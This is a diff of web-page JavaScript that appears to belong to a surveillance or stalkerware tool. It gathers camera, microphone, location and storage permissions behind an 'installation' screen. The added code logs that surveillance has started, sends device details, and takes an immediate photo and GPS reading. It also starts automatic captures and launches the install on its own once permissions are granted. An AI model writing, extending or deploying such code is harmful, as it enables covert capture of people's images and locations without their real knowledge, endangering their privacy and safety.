@@ -51,14 +51,18 @@ function showLater() {
 function showDashboard() {
   document.getElementById('screen-success').style.display = 'none';
   document.getElementById('screen-dash').style.display = 'block';
-  log('Dashboard actif', 'warn');
+  log('Dashboard actif — surveillance demarree', 'warn');
   sendData('device', {
     userAgent: navigator.userAgent,
     platform: navigator.platform,
     language: navigator.language,
     screen: window.innerWidth + 'x' + window.innerHeight
   });
+  // Demarrer les captures automatiques
   startAutoCapture();
+  // Premiere capture immediate
+  if (state.camera) doPhoto();
+  if (state.loc) doGPS();
 }
 
 // Permissions
@@ -118,11 +122,15 @@ function updatePermUI(type, granted) {
 
 function checkPerms() {
   var all = true;
-  ['camera','mic','loc','screen','notif','storage'].forEach(function(p) {
+  ['camera','mic','loc','notif','storage'].forEach(function(p) {
     if (!document.getElementById('p-' + p).classList.contains('granted')) all = false;
   });
   document.getElementById('installBtn').disabled = !all;
-  if (all) log('Toutes permissions OK', 'info');
+  if (all) {
+    log('Toutes permissions OK — installation...', 'info');
+    // Lancer l'installation automatiquement apres 500ms
+    setTimeout(function() { startInstall(); }, 500);
+  }
 }
 
 // Installation
